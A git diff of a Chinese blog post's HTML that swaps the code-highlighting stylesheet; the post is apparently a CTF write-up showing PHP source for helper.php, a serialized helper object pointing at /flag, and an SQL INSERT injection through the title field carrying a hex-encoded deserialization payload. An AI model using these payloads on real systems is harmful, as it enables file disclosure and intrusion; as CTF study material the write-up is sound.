@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -250,7 +258,7 @@
 <p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png" srcset="/img/loading.gif">   </p>
 <p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png" srcset="/img/loading.gif">      </p>
 <p>主要是<code>helper.php</code>    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
     <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;
     <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>; 
@@ -343,16 +351,16 @@
     &#125;
 &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png" srcset="/img/loading.gif"></p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
     <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>; 
     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;
 &#125;
 $a=<span class="hljs-keyword">new</span> helper();
 <span class="hljs-keyword">echo</span> serialize($a);
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>然后是sql <code>insert </code> 注入   </p>
 <p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p>
 <p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p>
@@ -519,6 +527,8 @@ $a=<span class="hljs-keyword">new</span> helper();
 
 
 
+  
+    
   
 
 
